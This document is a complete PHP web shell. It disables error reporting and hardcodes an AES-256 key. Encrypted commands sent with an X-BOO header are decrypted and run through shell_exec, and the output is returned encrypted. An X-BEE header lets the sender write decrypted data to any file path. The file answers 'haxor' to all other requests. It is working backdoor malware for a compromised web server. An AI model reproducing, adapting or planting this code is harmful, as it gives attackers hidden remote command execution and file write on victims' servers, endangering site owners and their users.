<?php
error_reporting(0);
function decrypt($ciphertext)
{
    $key = hex2bin("e6855ef46cce736eb64cd3b6b3796afca4aa30f2a0391041b91d0fb51a314510");
    // $key = pack("H*", "e6855ef46cce736eb64cd3b6b3796afca4aa30f2a0391041b91d0fb51a314510");
    return openssl_decrypt(hex2bin($ciphertext), 'aes-256-cbc', $key, OPENSSL_RAW_DATA);
    // return openssl_decrypt(pack("H*", $ciphertext), 'aes-256-cbc', $key, OPENSSL_RAW_DATA);
}

function encrypt($plaintext)
{
    $key = hex2bin("e6855ef46cce736eb64cd3b6b3796afca4aa30f2a0391041b91d0fb51a314510");
    // $key = pack("H*", "e6855ef46cce736eb64cd3b6b3796afca4aa30f2a0391041b91d0fb51a314510");
    return bin2hex(openssl_encrypt($plaintext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA));
}


function upload($data)
{
    $location = $_SERVER['HTTP_X_BEE'];
    return (file_put_contents($location, decrypt($data)));
}

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: *');

$data = file_get_contents('php://input');
if (array_key_exists('HTTP_X_BOO', $_SERVER)) {
    $res = shell_exec(decrypt($data) . '&');
    echo (encrypt($res));
} elseif (array_key_exists('HTTP_X_BEE', $_SERVER))
    echo (encrypt(upload($data)));
else echo ("haxor");
